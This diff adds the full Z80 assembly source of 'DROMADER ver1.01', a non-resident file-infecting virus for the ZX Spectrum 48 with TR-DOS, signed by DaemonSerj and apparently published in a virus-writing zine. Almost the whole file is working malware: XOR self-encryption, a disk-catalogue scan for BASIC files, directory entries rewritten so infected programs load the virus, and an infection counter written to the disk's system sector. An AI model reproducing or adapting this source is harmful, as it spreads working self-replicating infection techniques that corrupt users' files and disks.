@@ -1,0 +1,288 @@
+; (c) DaemonSerj
+; published in Social Distortion #2
+;Нерезидентный вирус для SPECTRUM 48 + TR-DOS
+
+        ORG     ENTRY_POINT
+        WOKRSP  EQU 0
+        hBASLEN EQU 0
+        lBASLEN EQU 0
+
+        DI                          ; Запретим прерывания
+        CALL    XORVIR              ; Расшифруем вирус
+BEGIN   LD      HL,LOOP             ; Пересядем в положенную область
+        LD      DE,WORKSP
+        PUSH    DE
+        LD      BC,LENGTH
+        LDIR
+        LD      HL,23867            ; Перепишем копию вируса
+        LD      DE,COPY_VR
+        LD      BC,BASLEN
+        LDIR
+        LD      HL,BEGIN-4          ; Сотрем вирус из строки...:)
+        LD      D,H
+        LD      E,L
+        INC     DE
+        LD      BC,LENVIR
+        LD      (HL),32
+        JP      13251               ; Стереть и JP (DE)
+
+LOOP    PHASE   WORKSP
+
+        LD      (BUF_SP),SP         ; Сохраним SP
+        LD      SP,WORKSP-1         ; Новый стек
+        LD      HL,51697            ; POP AF,RET
+        LD      (23746),HL          ; Будем пропускать ошибки - BREAK
+        LD      HL,CAT              ; Считаем каталог
+        LD      DE,0
+        LD      BC,2053
+        XOR     A
+        LD      (23824),A
+        CALL    15635               ; Диспетчер ДОС
+        DI
+        LD      DE,16               ; шаг - длинна элемента каталога
+        LD      IX,CAT+8            ; В элементе каталога указывает на тип
+        LD      B,128               ; 128 элементов
+FND     LD      A,'B'
+        CP      (IX+0)              ; BASIC файл ?
+        JR      Z,COMPARE
+DALEE   ADD     IX,DE               ; Ищем в каталоге BASIC файл
+        DJNZ    FND
+        JP      DR_MOVE             ; Нет бейсик файлов - на выход
+COMPARE LD      A,lBASLEN
+        CP      (IX+1)              ; Равна ли длинна длинне вируса
+        JR      NZ,FOUND            ; Если да, то файл уже заражен
+        LD      A,hBASLEN
+        CP      (IX+2)
+        JR      Z,DALEE             ; Берем следующий
+FOUND   LD      B,8
+        PUSH    IX
+        PUSH    IX
+        POP     HL                  ; На начало элемента
+        DEC     HL
+        DJNZ    $-1
+        LD      DE,LP_DATA          ; Скопируем в копию вируса
+        LD      BC,16
+        LDIR
+        LD      HL,VR_DATA          ; Занесем имя вируса в буфер
+        LD      DE,23773
+        LD      BC,9
+        LDIR
+        LD      IX,START            ; Зашифруем копию
+        CALL    WRKXOR
+        LD      HL,BASLEN+COPY_VR   ; Доделываем копию вируса
+        LD      (HL),128
+        INC     HL                  ; Идентификаторы TRDOS BASIC
+        LD      (HL),170
+        INC     HL
+        LD      (HL),1              ; Автостарт с первой строки
+        INC     HL
+        LD      (HL),0
+        LD      HL,5577             ; Обработка ошибок Enabled
+        LD      (23746),HL
+        LD      HL,COPY_VR          ; Создаем файл
+        LD      DE,BASLEN+4         ; (не BASIC)
+        LD      C,11                ; Но TRDOS он будет виден как BASIC
+        CALL    15635
+        DI
+        LD      HL,51697            ; Обработка ошибок Disabled
+        LD      (23746),HL
+        LD      HL,CAT              ; Читаем каталог и системный сектор
+        LD      DE,0
+        LD      BC,2309
+        CALL    15635
+        DI                          ; Ищем в каталоге име созданного вируса
+        LD      HL,CAT
+        PUSH    HL
+NXTCMP  POP     HL
+        LD      DE,VR_DATA
+        LD      BC,2048
+        LD      A,(DE)
+        CPIR
+        PUSH    HL
+        LD      B,8
+CMP2    INC     DE
+        LD      A,(DE)
+        CP      (HL)
+        JR      NZ,NXTCMP
+        INC     HL
+        DJNZ    CMP2
+        POP     HL
+        DEC     HL                  ; Обьявляем его стертым
+        XOR     A
+        LD      (HL),A
+        PUSH    HL                  ; IX - на имя вируса в каталоге
+        POP     IX
+        POP     HL                  ; HL - на имя заражаемой программы
+        INC     HL
+        LD      (IX+8),A            ; Зануляем тип
+        LD      E,(IX+11)           ; Берем длинну
+        LD      D,(IX+12)
+        DEC     DE
+        DEC     DE                  ; четыре ID байта TRDOS не считаются
+        DEC     DE
+        DEC     DE
+        LD      (HL),E              ; Скопируем в элемент каталога
+        INC     HL                  ; заражаемой программы
+        LD      (HL),D
+        INC     HL
+        LD      (HL),E
+        INC     HL
+        LD      (HL),D
+        INC     HL
+        INC     HL
+        LD      D,(IX+13)
+        PUSH    DE
+        LD      E,(IX+14)           ; Копируем номер трека и сектора
+        LD      D,(IX+15)
+        LD      (HL),E
+        INC     HL
+        LD      (HL),D
+        PUSH    IX                  ; Отьедем на системную область
+        POP     HL                  ; элемента каталога
+        LD      B,9
+        INC     HL
+        DJNZ    $-1
+        CPL                         ; A = FF
+        LD      D,H                 ; Затрем все данные в имени вируса
+        LD      E,L                 ; в каталоге
+        INC     DE
+        LD      BC,6
+        LD      (HL),A
+        LDIR
+        LD      HL,TR_SEC+0E4H      ; Уменьшили кол-во файлов на диске
+        DEC     (HL)                ; в служебном секторе
+        LD      HL,(TR_SEC+0E5H)    ; Количество свободных секторов на диске
+        POP     BC                  ; Число секторов вируса
+        INC     HL
+        DJNZ    $-1                 ; Увеличим
+        LD      (TR_SEC+0E5H),HL
+        LD      HL,MESSAGE          ; Поместим мессагу...
+        LD      DE,TR_SEC+8
+        LD      BC,MESLEN
+        LDIR
+        INC     DE
+        EX      DE,HL
+        INC     (HL)                ; Число заражений на данном диске
+        LD      HL,CAT              ; Пишем каталог
+        LD      DE,0
+        LD      BC,2310
+        CALL    15635
+        DI
+DR_MOVE
+
+LOADING DI
+        XOR     A               ; Считаем в дескриптор первый
+        LD      C,8             ; элемент каталога
+        CALL    15635
+        DI                      ; Обменяем с именем текущего носителя
+        CALL    EXCH
+        XOR     A               ; Запишем...
+        LD      C,9
+        CALL    15635
+        XOR     A               ; Читаем настоящую программу
+        LD      (23801),A
+        ADD     A,65
+        LD      HL,5577
+        LD      (23746),HL
+        LD      C,14
+        CALL    15635
+        DI
+        LD      HL,23734          ; Swap область данных TRDOS
+        LD      DE,TR_COPY
+        LD      BC,23867-23734
+        LDIR
+        CALL    EXCH              ; Обменяем обратно
+        XOR     A
+        LD      C,9               ; Запишем обратно
+        CALL    15635
+        DI
+        LD      HL,TR_COPY        ; Восстановим область данных TRDOS
+        LD      DE,23734
+        LD      BC,23867-23734
+        LDIR
+        LD      HL,23773          ; Похерим имя программы
+        LD      D,H
+        LD      E,L
+        INC     DE
+        LD      (HL),255
+        LD      BC,15
+        LDIR
+        LD      SP,(BUF_SP)       ; Восстановим стек
+        LD      HL,7788           ; Адрес подпрограммы RUN в BIOS
+        PUSH    HL
+        LD      IX,MAIN_PR
+        LD      L,(IX+9)
+        LD      H,(IX+10)
+        INC     HL
+        INC     HL
+        LD      DE,23867
+        ADD     HL,DE
+        LD      E,(HL)
+        INC     HL
+        LD      D,(HL)            ; Строка запуска - у нас 1
+        PUSH    DE
+        XOR     A
+        EI
+        LD      HL,WORKSP-64      ; Затрем вирус со всем остальным
+        LD      DE,WORKSP-63
+        LD      (HL),A
+        LD      BC,WRKLEN
+        JP      11179             ; В BIOS
+EXCH    LD      HL,23773
+        LD      DE,MAIN_PR
+        LD      B,16
+EXXX    LD      A,(HL)
+        EX      AF,AF'
+        LD      A,(DE)
+        LD      (HL),A
+        EX      AF,AF'
+        LD      (DE),A
+        INC     HL
+        INC     DE
+        DJNZ    EXXX
+        RET
+
+MESSAGE DEFM    " This disk infected by DROMADER ver1.01 "
+VR_DATA DEFM    " ver1.01C"
+BUF_SP  DEFW    0
+MAIN_PR DEFS    16
+
+        UNPHASE
+END     EQU     $
+
+XORVIR  LD      IX,BEGIN
+WRKXOR  LD      BC,LENXOR
+        LD      A,65
+        LD      R,A
+XORMET  LD      A,R
+        XOR     170
+        NEG
+        XOR     B
+        LD      R,A
+        XOR     (IX+0)
+        CPL
+        XOR     65
+        XOR     C
+        LD      (IX+0),A
+        INC     IX
+        DEC     BC
+        LD      A,B
+        OR      C
+        JR      NZ,XORMET
+        RET
+
+;-------EQUALS-------
+ENDVIR  EQU     $
+LENGTH  EQU     ENDVIR-LOOP
+LENVIR  EQU     ENDVIR-BEGIN+3
+LENXOR  EQU     END-BEGIN
+COPY_VR EQU     WORKSP-LENGTH+1
+BASLEN  EQU     hBASLEN*256+lBASLEN
+CAT     EQU     COPY_VR+BASLEN+4
+TR_SEC  EQU     CAT+2048
+WRKXOR  EQU     MAIN_PR+20
+MESLEN  EQU     VR_DATA-MESSAGE
+START   EQU     COPY_VR+BEGIN-23867
+LP_DATA EQU     COPY_VR+END-16-23867
+TR_COPY EQU     TR_SEC+256+1
+WRKLEN  EQU     TR_COPY+23867-23734-WORKSP+64
